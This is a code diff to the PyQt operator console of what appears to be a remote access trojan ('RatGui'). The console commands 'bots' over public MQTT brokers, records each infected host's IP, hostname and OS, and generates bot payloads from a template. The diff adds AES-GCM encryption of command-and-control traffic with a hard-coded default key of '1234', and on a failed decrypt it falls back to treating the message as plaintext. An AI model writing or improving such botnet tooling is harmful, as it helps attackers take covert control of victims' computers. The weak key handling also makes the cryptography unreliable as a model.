@@ -16,12 +16,16 @@ import paho.mqtt.client as mqtt
 from paho.mqtt.client import CallbackAPIVersion
 import ujson as json
 from plugins import load_plugins
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+import base64
+import time
 
 class MqttSignalHandler(QObject):
     message_received = pyqtSignal(dict)
 
 class SettingsDialog(QDialog):
-    def __init__(self, parent=None, history=[], topic='/commands/'):
+    def __init__(self, parent=None, history=[], topic='/commands/', encryption_key='1234'):
         super().__init__(parent)
         self.setWindowTitle('Settings')
         self.setStyleSheet("""
@@ -57,17 +61,19 @@ class SettingsDialog(QDialog):
         self.topic = QLineEdit(topic)
         self.api_token = QLineEdit()
         self.api_token.setPlaceholderText('API Token (optional for flespi)')
+        self.encryption_key = QLineEdit(encryption_key)
         layout.addRow('Broker URL:', self.broker_url)
         layout.addRow('Broker Port:', self.broker_port)
         layout.addRow('Topic:', self.topic)
         layout.addRow('API Token:', self.api_token)
+        layout.addRow('Encryption Key:', self.encryption_key)
         submit_button = QPushButton('Save')
         submit_button.clicked.connect(self.accept)
         layout.addWidget(submit_button)
         self.setLayout(layout)
 
 class ServerDialog(QDialog):
-    def __init__(self, title, parent=None, topic='/commands/'):
+    def __init__(self, title, parent=None, topic='/commands/', default_key='1234'):
         super().__init__(parent)
         self.setWindowTitle(title)
         self.setStyleSheet("""
@@ -103,7 +109,7 @@ class ServerDialog(QDialog):
         self.broker_url.setCurrentText('broker.hivemq.com')
         self.api_token = QLineEdit()
         self.api_token.setPlaceholderText('API Token (optional for flespi)')
-        self.encryption_key = QLineEdit(str(uuid.uuid4())[:16])
+        self.encryption_key = QLineEdit(default_key)  # Default encryption key from settings.json
         self.topic = QLineEdit(topic)
         layout.addRow('Bot Name:', self.bot_name)
         layout.addRow('Bot ID:', self.bot_id)
@@ -145,6 +151,7 @@ class ServerGeneratorThread(QThread):
             bot_code = bot_code.replace('{TOPIC}', self.server_info['topic'])
             bot_code = bot_code.replace('{BOT_ID}', self.server_info['id'])
             bot_code = bot_code.replace('{API_TOKEN}', self.server_info['api_token'] if self.server_info['broker_url'] == 'mqtt.flespi.io' else '')
+            bot_code = bot_code.replace('{ENCRYPTION_KEY}', self.server_info['key'])
 
             temp_dir = tempfile.mkdtemp()
             try:
@@ -346,15 +353,98 @@ class RatGui(QMainWindow):
         self.broker_port = 1883
         self.topic = '/commands/'
         self.broker_history = ['broker.hivemq.com', 'mqtt.flespi.io']
+        self.encryption_key = '1234'  # Default encryption key
         self.plugins = load_plugins(self)
         self.is_connected = False
 
         self.data_dir = 'data'
         if not os.path.exists(self.data_dir):
             os.makedirs(self.data_dir)
+        self.settings_file = os.path.join(self.data_dir, 'settings.json')
         self.json_file = os.path.join(self.data_dir, 'connections.json')
+        self.load_settings()  # Load encryption key from settings.json
         self.load_connections()
         self.connect_to_broker()
+
+    def load_settings(self):
+        """Load settings from settings.json, including the encryption key."""
+        try:
+            if os.path.exists(self.settings_file):
+                with open(self.settings_file, 'r') as f:
+                    settings = json.load(f)
+                self.encryption_key = settings.get('encryption_key', '1234')
+                self.broker_url = settings.get('broker_url', 'broker.hivemq.com')
+                self.broker_port = int(settings.get('broker_port', 1883))
+                self.topic = settings.get('topic', '/commands/')
+                self.broker_history = settings.get('broker_history', ['broker.hivemq.com', 'mqtt.flespi.io'])
+                self.log_area.append(f"Loaded settings from {self.settings_file}")
+            else:
+                self.save_settings()  # Create default settings file
+                self.log_area.append("No settings file found, created default settings")
+        except Exception as e:
+            self.log_area.append(f"Error loading settings: {e}")
+
+    def save_settings(self):
+        """Save settings to settings.json, including the encryption key."""
+        try:
+            settings = {
+                'encryption_key': self.encryption_key,
+                'broker_url': self.broker_url,
+                'broker_port': self.broker_port,
+                'topic': self.topic,
+                'broker_history': self.broker_history
+            }
+            with open(self.settings_file, 'w') as f:
+                json.dump(settings, f, indent=4)
+            self.log_area.append(f"Saved settings to {self.settings_file}")
+        except Exception as e:
+            self.log_area.append(f"Error saving settings: {e}")
+
+    def encrypt_message(self, message):
+        """Encrypt a message using AES-GCM with the global encryption key."""
+        key = self.encryption_key.encode('utf-8')
+        # Ensure the key is 16, 24, or 32 bytes long (AES-128, AES-192, AES-256)
+        if len(key) < 16:
+            key = key.ljust(16, b'\0')  # Pad with null bytes
+        elif len(key) > 16 and len(key) < 24:
+            key = key.ljust(24, b'\0')
+        elif len(key) > 24 and len(key) < 32:
+            key = key.ljust(32, b'\0')
+        else:
+            key = key[:32]  # Truncate to AES-256 length if too long
+        nonce = get_random_bytes(12)  # Explicitly use a 12-byte nonce to match Go
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        ciphertext, tag = cipher.encrypt_and_digest(message.encode('utf-8'))
+        encrypted = nonce + ciphertext + tag
+        self.log_area.append(f"GUI Encrypt: nonce_len={len(nonce)}, ciphertext_len={len(ciphertext)}, tag_len={len(tag)}")
+        encrypted_b64 = base64.b64encode(encrypted).decode('utf-8')
+        return encrypted_b64
+
+    def decrypt_message(self, encrypted_message):
+        """Decrypt an encrypted message using AES-GCM with the global encryption key."""
+        key = self.encryption_key.encode('utf-8')
+        # Ensure the key is 16, 24, or 32 bytes long (AES-128, AES-192, AES-256)
+        if len(key) < 16:
+            key = key.ljust(16, b'\0')  # Pad with null bytes
+        elif len(key) > 16 and len(key) < 24:
+            key = key.ljust(24, b'\0')
+        elif len(key) > 24 and len(key) < 32:
+            key = key.ljust(32, b'\0')
+        else:
+            key = key[:32]  # Truncate to AES-256 length if too long
+        try:
+            encrypted_data = base64.b64decode(encrypted_message)
+            self.log_area.append(f"GUI Decrypt: encrypted_data_len={len(encrypted_data)}")
+            nonce = encrypted_data[:12]  # GCM nonce is 12 bytes
+            tag = encrypted_data[-16:]   # Tag is 16 bytes
+            ciphertext = encrypted_data[12:-16]
+            self.log_area.append(f"GUI Decrypt: nonce_len={len(nonce)}, ciphertext_len={len(ciphertext)}, tag_len={len(tag)}")
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+            return plaintext.decode('utf-8')
+        except Exception as e:
+            self.log_area.append(f"Error decrypting message: {e}")
+            return encrypted_message  # Fallback to plaintext on error
 
     def filter_bots(self, text):
         try:
@@ -406,35 +496,19 @@ class RatGui(QMainWindow):
                 ip = self.device_table.item(row, 0).text()
                 hostname = self.device_table.item(row, 1).text()
                 os_info = self.device_table.item(row, 2).text()
-                bots.append({
+                bot_data = {
                     'id': bot_id,
                     'ip': ip,
                     'hostname': hostname,
                     'os': os_info
-                })
+                }
+                bots.append(bot_data)
             with open(self.json_file, 'w') as f:
                 json.dump(bots, f, indent=4)
             self.log_area.append(f"Saved {len(bots)} bots to {self.json_file}")
             self.update_connected_count()
         except Exception as e:
             self.log_area.append(f"Error saving connections: {e}")
-
-    def update_connected_count(self):
-        """Update connected bots count based on connections.json and their status."""
-        try:
-            if os.path.exists(self.json_file):
-                with open(self.json_file, 'r') as f:
-                    bots = json.load(f)
-                self.connected_bots_count = 0
-                for bot in bots:
-                    bot_id = bot['id']
-                    ip = bot.get('ip', 'Unknown')
-                    target = f"{ip}:{bot_id}"
-                    if target in self.device_status and self.device_status[target]['status'] == 'Connected':
-                        self.connected_bots_count += 1
-                self.status_bar.showMessage(f"{self.connected_bots_count} connected")
-        except Exception as e:
-            self.log_area.append(f"Error updating connected count: {e}")
 
     def connect_to_broker(self):
         try:
@@ -487,33 +561,46 @@ class RatGui(QMainWindow):
             if not message:
                 self.log_area.append("GUI received empty message, ignoring")
                 return
+
+            # Decrypt the message using the global key
+            message = self.decrypt_message(message)
             data = json.loads(message)
             self.signal_handler.message_received.emit(data)
         except Exception as e:
             self.log_area.append(f"Error processing message: {e}")
 
     def handle_message(self, data):
+        start_time = time.time()
         try:
+            # Handle connect messages for updating the device table
             if data.get('type') == 'connect':
                 print(f"GUI processing connect message: {data}")
                 self.update_device_table(data)
-                # Update count based on connections.json
                 self.update_connected_count()
-            else:
-                for plugin in self.plugins:
-                    self.log_area.append(f"GUI dispatching message to plugin: {plugin.name}")
-                    plugin.handle_response(data)
+
+            # Dispatch all messages to plugins, including connect messages
+            for plugin in self.plugins:
+                plugin_start = time.time()
+                self.log_area.append(f"GUI dispatching message to plugin: {plugin.name}")
+                plugin.handle_response(data)
+                plugin_end = time.time()
+                self.log_area.append(f"Plugin {plugin.name} took {plugin_end - plugin_start:.2f} seconds")
             self.log_area.append(f"GUI received message on topic {self.topic}: {json.dumps(data)}")
         except Exception as e:
             self.log_area.append(f"Error handling message: {e}")
+        finally:
+            end_time = time.time()
+            self.log_area.append(f"Total message handling took {end_time - start_time:.2f} seconds")
 
     def open_settings(self):
         try:
-            dialog = SettingsDialog(self, self.broker_history, self.topic)
+            dialog = SettingsDialog(self, self.broker_history, self.topic, self.encryption_key)
             if dialog.exec():
                 self.broker_url = dialog.broker_url.currentText()
                 self.broker_port = int(dialog.broker_port.text())
                 self.topic = dialog.topic.text()
+                self.encryption_key = dialog.encryption_key.text()  # Update global encryption key
+                self.save_settings()  # Save updated settings
                 if self.broker_url not in self.broker_history:
                     self.broker_history.append(self.broker_url)
                 self.client.disconnect()
@@ -529,13 +616,12 @@ class RatGui(QMainWindow):
 
     def create_server(self):
         try:
-            dialog = ServerDialog('Create Server', self, self.topic)
+            dialog = ServerDialog('Create Server', self, self.topic, self.encryption_key)
             if dialog.exec():
                 server_info = dialog.get_server_info()
                 server_info.update({
                     'broker_url': self.broker_url,
                     'broker_port': self.broker_port,
-                    'encryption_key': server_info['key']
                 })
                 self.create_server_button.setEnabled(False)
                 self.generator_thread = ServerGeneratorThread(server_info)
@@ -595,11 +681,17 @@ class RatGui(QMainWindow):
                 target = f"{ip}:{bot_id}"
             else:
                 target = 'all'
-
+            # self.log_area.append(f"Populating context menu for target: {target}")
+            self.log_area.append(f"Total plugins loaded: {len(self.plugins)}")
             for plugin in self.plugins:
-                action = menu.addAction(plugin.get_menu_action())
-                action.triggered.connect(lambda checked, t=target, p=plugin: p.execute(t))
-
+                # self.log_area.append(f"Adding plugin to context menu: {plugin.name}")
+                try:
+                    action_name = plugin.get_menu_action()
+                    # self.log_area.append(f"Plugin menu action: {action_name}")
+                    action = menu.addAction(action_name)
+                    action.triggered.connect(lambda checked, t=target, p=plugin: p.execute(t))
+                except Exception as e:
+                    self.log_area.append(f"Error adding plugin {plugin.name} to context menu: {e}")
             if self.sender() == self.device_table:
                 menu.exec(self.device_table.mapToGlobal(position))
             else:
@@ -650,7 +742,7 @@ class RatGui(QMainWindow):
                     old_status = self.device_status[target]['status']
                     if old_status != new_status:
                         self.device_status[target]['status'] = new_status
-                        self.update_connected_count()  # Update count based on connections.json
+                        self.update_connected_count()
                     self.device_table.setItem(row, 3, QTableWidgetItem(new_status))
                     if new_status == 'Connected' and seconds_ago < 30:
                         last_ping_text = f"{seconds_ago} sec ago"
@@ -659,6 +751,23 @@ class RatGui(QMainWindow):
                     self.device_table.setItem(row, 4, QTableWidgetItem(last_ping_text))
         except Exception as e:
             self.log_area.append(f"Error updating device status: {e}")
+
+    def update_connected_count(self):
+        """Update connected bots count based on connections.json and their status."""
+        try:
+            if os.path.exists(self.json_file):
+                with open(self.json_file, 'r') as f:
+                    bots = json.load(f)
+                self.connected_bots_count = 0
+                for bot in bots:
+                    bot_id = bot['id']
+                    ip = bot.get('ip', 'Unknown')
+                    target = f"{ip}:{bot_id}"
+                    if target in self.device_status and self.device_status[target]['status'] == 'Connected':
+                        self.connected_bots_count += 1
+                self.status_bar.showMessage(f"{self.connected_bots_count} connected")
+        except Exception as e:
+            self.log_area.append(f"Error updating connected count: {e}")
 
 def exception_hook(exctype, value, traceback_info):
     error_msg = ''.join(traceback.format_exception(exctype, value, traceback_info))
